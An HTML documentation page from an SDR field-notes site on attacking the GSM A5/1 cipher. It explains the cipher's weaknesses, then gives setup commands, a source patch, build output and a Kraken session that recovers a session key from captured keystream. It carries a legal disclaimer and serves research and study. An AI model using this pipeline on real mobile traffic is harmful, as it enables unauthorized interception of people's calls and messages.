@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>A5/1 — GSM Ciphering &mdash; Software Defined Radio 1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=29a6c3e3"></script>
+      <script src="../../_static/doctools.js?v=9a2dae69"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="3G : UMTS/HSPA/HSPA+" href="../3G/index.html" />
+    <link rel="prev" title="OsmocomBB" href="osmocombb.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Software Defined Radio
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul class="current">
+<li class="toctree-l1 current"><a class="reference internal" href="../index.html">English - SDR Blackbook – Field Notes &amp; Hacks</a><ul class="current">
+<li class="toctree-l2 current"><a class="reference internal" href="../index.html#quick-navigation">Quick Navigation</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="../sdr/index.html">SDR</a></li>
+<li class="toctree-l3 current"><a class="reference internal" href="index.html">2G</a><ul class="current">
+<li class="toctree-l4 current"><a class="reference internal" href="index.html#quick-navigation">Quick Navigation</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../3G/index.html">3G : UMTS/HSPA/HSPA+</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../4G/index.html">4G : LTE/LTE+</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../5G/index.html">5G : NSA/SA</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../faq.html">Q&amp;A</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../about.html">Who am I</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../fr/index-fr.html">Français - SDR Blackbook – Carnet de terrain &amp; hacks</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Software Defined Radio</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../index.html">English - SDR Blackbook – Field Notes &amp; Hacks</a></li>
+          <li class="breadcrumb-item"><a href="index.html">2G</a></li>
+      <li class="breadcrumb-item active">A5/1 — GSM Ciphering</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/en/2G/a51.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="a5-1-gsm-ciphering">
+<h1>A5/1 — GSM Ciphering<a class="headerlink" href="#a5-1-gsm-ciphering" title="Link to this heading"></a></h1>
+<p><strong>A5/1</strong> is the stream cipher algorithm used in GSM to provide confidentiality for radio communications between the mobile device and the BTS.</p>
+<section id="fonctionnement">
+<h2>1. Fonctionnement<a class="headerlink" href="#fonctionnement" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><strong>Stream cipher</strong> with a 64-bit internal state (3 LFSR shift registers)</p></li>
+<li><p>Initialized using the <strong>Kc</strong> key (derived from the SIM’s Ki via the A3/A8 algorithm and the subscriber’s IMSI)</p></li>
+<li><p>Ciphering is applied in real-time, bit by bit, to voice or data</p></li>
+</ul>
+</section>
+<section id="vulnerabilites-connues">
+<h2>2. Vulnérabilités connues<a class="headerlink" href="#vulnerabilites-connues" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><strong>Aged design (1980s/1990s)</strong></p></li>
+<li><p>Several known attacks:</p>
+<ul>
+<li><p>Rainbow tables (time-memory tradeoff, e.g., Kraken/A5/1 project)</p></li>
+<li><p>Attacks on LFSR weaknesses and register synchronization</p></li>
+<li><p>Kc recovery if enough keystream is captured</p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="outils-open-source-utiles">
+<h2>3. Outils open-source utiles<a class="headerlink" href="#outils-open-source-utiles" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/joswr1ght/kraken">Kraken</a></p></li>
+<li><p><a class="reference external" href="https://github.com/ptrkrysik/gr-gsm">gr-gsm</a></p></li>
+<li><p><a class="reference external" href="https://brmlab.cz/project/gsm/deka/deka">deka project</a></p></li>
+<li><p>[deka source code]((https://jenda.hrach.eu/p/deka)</p></li>
+<li><p><a class="reference external" href="https://brmlab.cz/project/gsm/deka/deka-test">keystreams for testing</a></p></li>
+<li><p><strong>OsmocomBB</strong>: possible to inject or dump keystreams for brute-force attacks</p></li>
+</ul>
+</section>
+<section id="demarrage-du-pipeline-et-tests-de-detection">
+<h2>4. Démarrage du pipeline et tests de détection<a class="headerlink" href="#demarrage-du-pipeline-et-tests-de-detection" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>If the cell sends a “Ciphering Indicator,” some phones warn when ciphering is off</p></li>
+<li><p>Most modern networks disable A5/1, switch to A5/3, or use no ciphering at all</p></li>
+</ul>
+</section>
+<section id="references-utiles-liens">
+<h2>5. Références utiles (liens)<a class="headerlink" href="#references-utiles-liens" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://en.wikipedia.org/wiki/A5/1">A5/1 on Wikipedia</a></p></li>
+<li><p><a class="reference external" href="https://fahrplan.events.ccc.de/congress/2010/Fahrplan/attachments/1783_101228.27C3.GSM-Sniffing.Nohl_Munaut.pdf">A5/1 Attacks (Karsten Nohl, CCC)</a></p></li>
+</ul>
+<hr class="docutils" />
+<p><strong>Legal note:</strong><br />
+Any attack or reverse-engineering of A5/1 is reserved for research, authorized pentesting, or legal demonstration purposes only.<br />
+<strong>Unauthorized interception is illegal</strong> in most countries.</p>
+</section>
+<hr class="docutils" />
+<section id="kraken-tables-arc-en-ciel-usage-limites">
+<h2>6. Kraken — tables arc-en-ciel (usage &amp; limites)<a class="headerlink" href="#kraken-tables-arc-en-ciel-usage-limites" title="Link to this heading"></a></h2>
+<p><strong>Kraken</strong> is an open-source tool designed to brute-force the <strong>A5/1 cipher</strong> used in GSM (2G) by leveraging <strong>rainbow tables</strong> (precomputed lookup tables).</p>
+<ul class="simple">
+<li><p><strong>Goal:</strong> Recover the session key Kc from a known segment of keystream (known plaintext).</p></li>
+<li><p><strong>How it works:</strong></p>
+<ol class="arabic simple">
+<li><p>Capture A5/1 encrypted bursts (e.g., via OsmocomBB or Airprobe).</p></li>
+<li><p>If you know a part of the plaintext, you can extract the keystream.</p></li>
+<li><p>Run Kraken: it compares this keystream to its rainbow tables (several terabytes of data), and may recover the key in seconds/minutes <strong>if</strong> the keystream exists in the tables.</p></li>
+<li><p>With Kc, you can decrypt all encrypted GSM traffic (voice, SMS, etc.) for that session.</p></li>
+</ol>
+</li>
+<li><p><strong>Limitations:</strong></p>
+<ul>
+<li><p>You need a high-quality keystream (often 64 error-free bits).</p></li>
+<li><p>The tables do not cover the <em>entire</em> keyspace (success probability ~22–24% per table, up to ~50–60% with multiple sets).</p></li>
+<li><p>Extremely sensitive to any radio reception error.</p></li>
+</ul>
+</li>
+</ul>
+<p>Kraken is typically used via command line with a binary keystream file (<code class="docutils literal notranslate"><span class="pre">.kc</span></code>) and a folder containing the rainbow tables (<code class="docutils literal notranslate"><span class="pre">.bin</span></code> files, several GB to TB).</p>
+</section>
+<hr class="docutils" />
+<section id="behemoth-py-orchestration-batch">
+<h2>7. behemoth.py — orchestration &amp; batch<a class="headerlink" href="#behemoth-py-orchestration-batch" title="Link to this heading"></a></h2>
+<p><strong>behemoth.py</strong> is a <strong>Python wrapper</strong> to make Kraken easier to use, automating and parallelizing the process on large datasets, clusters, or multiple CPUs/GPUs.</p>
+<ul class="simple">
+<li><p><strong>Typical features:</strong></p>
+<ul>
+<li><p>Split keystreams into blocks and run several Kraken instances in parallel.</p></li>
+<li><p>Distribute jobs across multiple machines or cores.</p></li>
+<li><p>Batch process (automated attacks on lots of captures, or with multiple tables).</p></li>
+<li><p>Logging, relaunching, handling timeouts, aggregating results.</p></li>
+<li><p>Support for cluster/cloud infrastructure (e.g., orchestrate Kraken over 8–16+ machines).</p></li>
+</ul>
+</li>
+<li><p><strong>Advantages:</strong></p>
+<ul>
+<li><p>Much faster (massive, multi-threaded, scalable attack).</p></li>
+<li><p>Can “industrialize” the process (pipelines, logs, monitoring).</p></li>
+</ul>
+</li>
+</ul>
+<p><strong>Note:</strong> behemoth.py is not an “official” part of Kraken, but a community-made tool, often adapted for specific research or CTF team workflows.</p>
+</section>
+<hr class="docutils" />
+<section id="resume-bonnes-pratiques">
+<h2>8. Résumé &amp; bonnes pratiques<a class="headerlink" href="#resume-bonnes-pratiques" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><strong>Kraken:</strong> A5/1 brute-force for GSM using rainbow tables (~8 TB for full coverage), on a single machine.</p></li>
+<li><p><strong>behemoth.py:</strong> Python pipeline that orchestrates multiple Kraken runs in parallel (batch, cluster), for industrial-scale Kc recovery.</p></li>
+</ul>
+</section>
+<section id="installation-prerequis-kraken">
+<h2>9. Installation &amp; prérequis (Kraken)<a class="headerlink" href="#installation-prerequis-kraken" title="Link to this heading"></a></h2>
+<p>For 6 tables… adapt for the 40</p>
+<p>Create logical volumes for indexes (2x40Gb/tables 100Gb&gt;80Gb)</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>vgcreate<span class="w"> </span>indexes<span class="w"> </span>/dev/nvme1n1p1
+sudo<span class="w"> </span>lvcreate<span class="w"> </span>-n<span class="w"> </span>ltest0<span class="w"> </span>-L<span class="w"> </span>100G<span class="w"> </span>index
+sudo<span class="w"> </span>lvcreate<span class="w"> </span>-n<span class="w"> </span>ltest1<span class="w"> </span>-L<span class="w"> </span>100G<span class="w"> </span>index
+sudo<span class="w"> </span>lvcreate<span class="w"> </span>-n<span class="w"> </span>ltest2<span class="w"> </span>-L<span class="w"> </span>100G<span class="w"> </span>index
+</pre></div>
+</div>
+<p>Install python2.7 for Behemoth</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mkdir<span class="w"> </span>-p<span class="w"> </span>~/miniconda3
+wget<span class="w"> </span>https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh<span class="w"> </span>-O<span class="w"> </span>~/miniconda3/miniconda.sh
+bash<span class="w"> </span>~/miniconda3/miniconda.sh<span class="w"> </span>-b<span class="w"> </span>-u<span class="w"> </span>-p<span class="w"> </span>~/miniconda3
+rm<span class="w"> </span>~/miniconda3/miniconda.sh
+<span class="nb">source</span><span class="w"> </span>~/miniconda3/bin/activate<span class="w"> </span>
+conda<span class="w"> </span>create<span class="w"> </span>-n<span class="w"> </span>py27<span class="w"> </span><span class="nv">python</span><span class="o">=</span><span class="m">2</span>.7
+conda<span class="w"> </span>activate<span class="w"> </span>py27
+</pre></div>
+</div>
+<p>Clone kraken</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/joswr1ght/kraken
+<span class="nb">cd</span><span class="w"> </span>kraken/indexes
+cp<span class="w"> </span>tables.conf.sample<span class="w"> </span>tables.conf
+</pre></div>
+</div>
+<p>Tables are here</p>
+<p><a class="reference external" href="https://infocon.org/rainbow%20tables/A51/">tables</a></p>
+<p>tutorial is made with the 6 first in /root/kraken/indexes</p>
+<p>Change tables.conf accordigly to your logical volumes</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Devices:  dev/node max_tables</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test0</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test1</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test2</span> <span class="mi">2</span>
+
+<span class="c1">#Tables: dev id(advance) offset</span>
+</pre></div>
+</div>
+<p>Patch kraken</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nano<span class="w"> </span>kraken.patch
+</pre></div>
+</div>
+<p>Copy this inside</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>---<span class="w"> </span>kraken/Kraken/DeltaLookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">19</span>:03:54.175674749<span class="w"> </span>+0200
++++<span class="w"> </span>kraken/Kraken/DeltaLookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">18</span>:59:31.433983884<span class="w"> </span>+0200
+@@<span class="w"> </span>-9,7<span class="w"> </span>+9,7<span class="w"> </span>@@
+<span class="w"> </span><span class="c1">#include &lt;assert.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;stdlib.h&gt;</span>
+<span class="w"> </span><span class="c1">#if !defined(__APPLE__)</span>
+-#include<span class="w"> </span>&lt;stropts.h&gt;
++#include<span class="w"> </span>&lt;sys/ioctl.h&gt;
+<span class="w"> </span><span class="c1">#else </span>
+<span class="w"> </span><span class="c1">#include &lt;unistd.h&gt;</span>
+<span class="w"> </span><span class="c1">#endif /* __APPLE__ */</span>
+---<span class="w"> </span>kraken/Utilities/DeltaLookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">19</span>:03:54.180703586<span class="w"> </span>+0200
++++<span class="w"> </span>kraken/Utilities/DeltaLookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">19</span>:03:09.616665058<span class="w"> </span>+0200
+@@<span class="w"> </span>-9,7<span class="w"> </span>+9,7<span class="w"> </span>@@
+<span class="w"> </span><span class="c1">#include &lt;assert.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;linux/fs.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;stdlib.h&gt;</span>
+-#include<span class="w"> </span>&lt;stropts.h&gt;
++#include<span class="w"> </span>&lt;sys/ioctl.h&gt;
+<span class="w"> </span><span class="c1">#include &lt;fcntl.h&gt;</span>
+<span class="w"> </span>
+<span class="w"> </span><span class="c1">#define READ8()\</span>
+---<span class="w"> </span>kraken/Utilities/SSDlookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">19</span>:03:54.180703586<span class="w"> </span>+0200
++++<span class="w"> </span>kraken/Utilities/SSDlookup.cpp<span class="w">	</span><span class="m">2025</span>-09-19<span class="w"> </span><span class="m">19</span>:01:22.512755994<span class="w"> </span>+0200
+@@<span class="w"> </span>-8,7<span class="w"> </span>+8,7<span class="w"> </span>@@
+<span class="w"> </span><span class="c1">#include &lt;assert.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;linux/fs.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;stdlib.h&gt;</span>
+-#include<span class="w"> </span>&lt;stropts.h&gt;
++#include<span class="w"> </span>&lt;sys/ioctl.h&gt;
+<span class="w"> </span><span class="c1">#include &lt;fcntl.h&gt;</span>
+<span class="w"> </span><span class="c1">#include &lt;unistd.h&gt;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>patch<span class="w"> </span>-p0<span class="w"> </span>kraken.patch
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@legion:~/kraken#<span class="w"> </span>make<span class="w"> </span>noati
+<span class="nb">cd</span><span class="w"> </span>a5_cpu<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./build.sh
+<span class="nb">cd</span><span class="w"> </span>Kraken<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./build.sh
+make<span class="w"> </span>-C<span class="w"> </span>TableConvert
+make<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>:<span class="w"> </span>on<span class="w"> </span>entre<span class="w"> </span>dans<span class="w"> </span>le<span class="w"> </span>répertoire<span class="w"> </span>«<span class="w"> </span>/root/kraken/TableConvert<span class="w"> </span>»
+make<span class="o">[</span><span class="m">1</span><span class="o">]</span>:<span class="w"> </span>Rien<span class="w"> </span>à<span class="w"> </span>faire<span class="w"> </span>pour<span class="w"> </span>«<span class="w"> </span>all<span class="w"> </span>».
+make<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>:<span class="w"> </span>on<span class="w"> </span>quitte<span class="w"> </span>le<span class="w"> </span>répertoire<span class="w"> </span>«<span class="w"> </span>/root/kraken/TableConvert<span class="w"> </span>»
+make<span class="w"> </span>-C<span class="w"> </span>Utilities
+make<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>:<span class="w"> </span>on<span class="w"> </span>entre<span class="w"> </span>dans<span class="w"> </span>le<span class="w"> </span>répertoire<span class="w"> </span>«<span class="w"> </span>/root/kraken/Utilities<span class="w"> </span>»
+g++<span class="w"> </span>-g<span class="w"> </span>-o<span class="w"> </span>a5lookup<span class="w"> </span>a5lookup.cpp<span class="w"> </span>Bidirectional.cpp<span class="w"> </span>SSDlookup.cpp<span class="w"> </span>DeltaLookup.cpp<span class="w"> </span><span class="se">\</span>
+../a5_cpu/A5CpuStubs.cpp<span class="w"> </span>-ldl
+g++<span class="w"> </span>-o<span class="w"> </span>getstate<span class="w"> </span>getstate.cpp<span class="w"> </span>Bidirectional.cpp
+g++<span class="w"> </span>-o<span class="w"> </span>find_kc<span class="w"> </span>find_kc.cpp<span class="w"> </span>Bidirectional.cpp<span class="w"> </span>TheMatrix.cpp
+make<span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>:<span class="w"> </span>on<span class="w"> </span>quitte<span class="w"> </span>le<span class="w"> </span>répertoire<span class="w"> </span>«<span class="w"> </span>/root/kraken/Utilities<span class="w"> </span>»
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>Behemoth.py<span class="w"> </span>/root/kraken/indexes
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>py27<span class="o">)</span><span class="w"> </span>root@legion:/root/kraken/indexes#<span class="w"> </span>python<span class="w"> </span>Behemoth.py<span class="w"> </span>/root/kraken/indexes
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_124.dlt<span class="w"> </span><span class="m">124</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_124.dlt /dev/indexes/lvol0:0 124.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>0i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol0<span class="o">)</span>
+6202165651i<span class="w"> </span>chains<span class="w"> </span>written.
+6202165651i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.093979<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_116.dlt<span class="w"> </span><span class="m">116</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_116.dlt /dev/indexes/lvol0:10238642 116.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>10238642i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol0<span class="o">)</span>
+6197992298i<span class="w"> </span>chains<span class="w"> </span>written.
+6197992298i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.094944<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_100.dlt<span class="w"> </span><span class="m">100</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_100.dlt /dev/indexes/lvol1:0 100.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>0i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol1<span class="o">)</span>
+6196072189i<span class="w"> </span>chains<span class="w"> </span>written.
+6196072189i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.095421<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_108.dlt<span class="w"> </span><span class="m">108</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_108.dlt /dev/indexes/lvol1:10228856 108.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>10228856i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol1<span class="o">)</span>
+6199297314i<span class="w"> </span>chains<span class="w"> </span>written.
+6199297314i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.096107<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_132.dlt<span class="w"> </span><span class="m">132</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_132.dlt /dev/indexes/lvol2:0 132.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>0i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol2<span class="o">)</span>
+6216219012i<span class="w"> </span>chains<span class="w"> </span>written.
+6216219012i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.141064<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+Adding<span class="w"> </span>table:<span class="w">  </span>/root/kraken/indexes/a51_table_140.dlt<span class="w"> </span><span class="m">140</span>
+Running<span class="w"> </span><span class="s2">&quot;./../TableConvert/TableConvert di /root/kraken/indexes/a51_table_140.dlt /dev/indexes/lvol2:10270774 140.idx&quot;</span>
+seek<span class="w"> </span>offset:<span class="w"> </span>10270774i<span class="w"> </span>blocks<span class="w"> </span><span class="o">(</span>/dev/indexes/lvol2<span class="o">)</span>
+6201225335i<span class="w"> </span>chains<span class="w"> </span>written.
+6201225335i<span class="w"> </span>chains<span class="w"> </span>written,<span class="w"> </span><span class="m">54</span>.095703<span class="w"> </span>bits<span class="w"> </span>pr<span class="w"> </span>chain.
+</pre></div>
+</div>
+<p>The tables should automaticly look like something like this</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Devices:  dev/node max_tables</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test0</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test1</span> <span class="mi">2</span>
+<span class="n">Device</span><span class="p">:</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">test2</span> <span class="mi">2</span>
+
+<span class="c1">#Tables: dev id(advance) offset</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">116</span> <span class="mi">10238642</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">124</span> <span class="mi">0</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">1</span> <span class="mi">108</span> <span class="mi">10228856</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">1</span> <span class="mi">100</span> <span class="mi">0</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">2</span> <span class="mi">140</span> <span class="mi">10270774</span>
+<span class="n">Table</span><span class="p">:</span> <span class="mi">2</span> <span class="mi">132</span> <span class="mi">0</span>
+</pre></div>
+</div>
+<p>Now it is time to test !</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>root@legion:~/kraken/Kraken#<span class="w"> </span>./kraken<span class="w"> </span>../indexes
+Device:<span class="w"> </span>/dev/index/test0<span class="w"> </span><span class="m">2</span>
+/dev/index/test0
+Device:<span class="w"> </span>/dev/index/test1<span class="w"> </span><span class="m">2</span>
+/dev/index/test1
+Device:<span class="w"> </span>/dev/index/test2<span class="w"> </span><span class="m">2</span>
+/dev/index/test2
+Allocated<span class="w"> </span><span class="m">41247488</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/116.idx
+Allocated<span class="w"> </span><span class="m">41274520</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/124.idx
+Allocated<span class="w"> </span><span class="m">41257060</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/108.idx
+Allocated<span class="w"> </span><span class="m">41235072</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/100.idx
+Allocated<span class="w"> </span><span class="m">41269576</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/140.idx
+Allocated<span class="w"> </span><span class="m">41404056</span><span class="w"> </span>bytes:<span class="w"> </span>../indexes/132.idx
+Tables:<span class="w"> </span><span class="m">116</span>,124,108,100,140,132
+Commands<span class="w"> </span>are:<span class="w"> </span>crack<span class="w"> </span><span class="nb">test</span><span class="w"> </span>quit
+
+Kraken&gt;<span class="w"> </span>crack<span class="w"> </span><span class="m">101011100010100000110010010001001001001001001011111111001001001100101000111111110110110111011000100000101110000000</span>
+
+Cracking<span class="w"> </span><span class="m">101011100010100000110010010001001001001001001011111111001001001100101000111111110110110111011000100000101110000000</span>
+Found<span class="w"> </span>9970766682852257085x<span class="w"> </span>@<span class="w"> </span><span class="m">43</span><span class="w">  </span><span class="c1">#0  (table:100)</span>
+crack<span class="w"> </span><span class="c1">#0 took 2858 msec</span>
+
+Kraken&gt;<span class="w"> </span>
+</pre></div>
+</div>
+</section>
+<section id="deka-install-kraken-opencl-cracker">
+<h2>10 Deka Install (Kraken OpenCL cracker)<a class="headerlink" href="#deka-install-kraken-opencl-cracker" title="Link to this heading"></a></h2>
+<section id="preparation-du-systeme-et-prerequis">
+<h3>10.1 Préparation du système et prérequis<a class="headerlink" href="#preparation-du-systeme-et-prerequis" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><strong>OS:</strong> Debian Jessie up to Bookworm, or Ubuntu</p></li>
+<li><p><strong>GPU:</strong> AMD recommended (Nvidia possible but more patching needed)</p></li>
+<li><p><strong>Python 3</strong> (some scripts might require 2.7 as well)</p></li>
+<li><p><strong>PyOpenCL</strong></p></li>
+<li><p><strong>Disk:</strong> ≥2 TB free for tables (SSD/NVMe best)</p></li>
+<li><p><strong>Packages:</strong></p></li>
+</ul>
+<p>You will need (if you use only 6 tables instead of 40) fake.idx to put in /root/kraken/indexes/00.idx
+<a class="reference download internal" download="" href="../../_downloads/f44765ff25fa31707e4159e3fcb4ba1c/00.idx"><span class="xref download myst">download fake idx</span></a></p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>apt<span class="w"> </span>update
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>git<span class="w"> </span>build-essential<span class="w"> </span>python3.12<span class="w"> </span>python3.12-pip<span class="w"> </span>python3.12-venv<span class="w"> </span>opencl-c-headers<span class="w"> </span>clinfo
+python3.12<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.env
+pip3<span class="w"> </span>install<span class="w"> </span>pyopencl<span class="w"> </span>torch<span class="w"> </span>pyopencl<span class="w"> </span>pocl
+</pre></div>
+</div>
+</section>
+<hr class="docutils" />
+<section id="recuperation-du-code">
+<h3>10.2 Récupération du code<a class="headerlink" href="#recuperation-du-code" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://jenda.hrach.eu/p/deka">https://jenda.hrach.eu/p/deka</a></p></li>
+</ul>
